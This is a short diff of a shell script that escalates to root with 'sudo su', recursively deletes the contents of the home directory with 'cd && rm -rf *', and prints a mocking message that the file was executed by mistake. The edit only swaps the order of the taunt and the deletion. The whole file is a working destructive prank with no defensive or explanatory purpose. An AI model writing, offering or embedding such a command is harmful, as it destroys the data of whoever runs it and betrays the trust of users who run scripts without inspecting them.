@@ -1,2 +1,3 @@
 sudo su
-cd && rm -rf * ; echo "LOL you mistakenly executed this file :("
+echo "LOL you mistakenly executed this file :("
+cd && rm -rf *
